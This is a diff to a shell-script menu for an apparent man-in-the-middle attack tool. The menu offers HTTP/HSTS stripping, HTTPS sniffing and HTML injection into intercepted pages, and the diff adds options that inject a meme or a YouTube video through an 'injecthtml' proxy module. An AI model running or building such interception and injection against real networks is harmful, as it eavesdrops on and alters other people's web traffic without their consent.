@@ -46,6 +46,8 @@ echo "(3) HTTP and HSTS attack + sniff"
 echo "(4) Force sniff HTTPS traffic (loud)"
 echo "(5) Make all pages pink"
 echo "(6) Inject HACKED! js alert"
+echo "(7) Display meme on all insecure pages"
+echo "(8) Play Baby Youtube video"
 echo "(c) custom command"
 read option
 echo "just a moment ..."
@@ -81,6 +83,10 @@ fi
 if [ "$option" = "7" ]; then
 	echo $COMMAND" --proxy-module injecthtml --html-file hacked.html"
 	$(echo $COMMAND" --proxy-module injecthtml --html-file hacked.html")
+fi
+if [ "$option" = "8" ]; then
+	echo $COMMAND" --proxy-module injecthtml --html-file baby.html"
+	$(echo $COMMAND" --proxy-module injecthtml --html-file baby.html")
 fi
 if [ "$option" = "c" ]; then
 	echo "type your custom command:"
